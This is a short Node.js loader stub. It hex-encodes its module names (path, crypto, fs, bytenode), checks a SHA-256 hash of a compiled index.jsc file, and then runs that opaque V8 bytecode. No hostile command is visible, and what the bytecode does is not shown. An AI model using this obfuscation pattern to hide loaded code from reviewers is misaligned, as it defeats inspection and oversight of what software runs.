"use strict";
var _bc6394d=function(h){for(var r="",i=0;i<h.length;i+=2)r+=String.fromCharCode(parseInt(h.substr(i,2),16));return r};
var _bc6394p=require(_bc6394d("70617468")).join(__dirname,"./index.jsc");
var _bc6394h=require(_bc6394d("63727970746f")).createHash("sha256").update(require(_bc6394d("6673")).readFileSync(_bc6394p)).digest("hex");
if(_bc6394h!==("1e792adc5b74f89402b9bf3298a96f59"+"9388731f71ceeab1942a910ca0730435")){console.error("[fatal] integrity check failed");process.exit(1);}
require(_bc6394d("627974656e6f6465"));
var _bc6394m=require(_bc6394p);

exports.default=_bc6394m.default!==void 0?_bc6394m.default:_bc6394m;
